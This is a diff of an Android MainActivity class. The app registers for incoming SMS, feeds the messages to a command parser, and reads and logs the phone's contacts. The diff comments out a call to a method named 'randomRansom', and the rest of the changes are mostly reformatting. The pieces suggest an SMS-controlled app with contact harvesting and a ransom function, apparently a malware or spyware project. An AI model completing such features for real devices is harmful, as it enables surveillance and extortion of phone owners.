@@ -32,6 +32,8 @@ public class MainActivity extends Activity implements Commandable {
 	private SMSReceiver receiver;
 	private IntentFilter filter;
 	
+	private String SMS = "android.provider.Telephony.SMS_RECEIVED";
+
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
@@ -42,23 +44,22 @@ public class MainActivity extends Activity implements Commandable {
 		receiver.addConsumer(parser);
 
 		filter = new IntentFilter();
-		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
-		registerReceiver(receiver, filter);
-		
-		this.randomRansom();
+		filter.addAction(SMS);
+		this.registerReceiver(receiver, filter);
+
+		//this.randomRansom();
 	}
-	
-	protected void onRestart(){
+
+	protected void onRestart() {
 		registerReceiver(receiver, filter);
 		super.onRestart();
 	}
-	
-	protected void onStop()
-	{
-	    unregisterReceiver(receiver);
-	    super.onStop();
+
+	protected void onStop() {
+		unregisterReceiver(receiver);
+		super.onStop();
 	}
-	
+
 	public boolean onCreateOptionsMenu(Menu menu) {
 		getMenuInflater().inflate(R.menu.main, menu);
 		return true;
@@ -67,7 +68,8 @@ public class MainActivity extends Activity implements Commandable {
 	private ArrayList<Contact> contacts;
 
 	public void getContactList() {
-		this.contacts = new ContactsReader(this.getApplicationContext()).contacts();
+		this.contacts = new ContactsReader(this.getApplicationContext())
+				.contacts();
 		Log.d("SAFEAPP", contacts.toString());
 	}
 
@@ -147,6 +149,6 @@ public class MainActivity extends Activity implements Commandable {
 
 	@Override
 	public void sendSMS(String nro, String mensaje) {
-		// TODO Auto-generated method stub	
+		// TODO Auto-generated method stub
 	}
 }
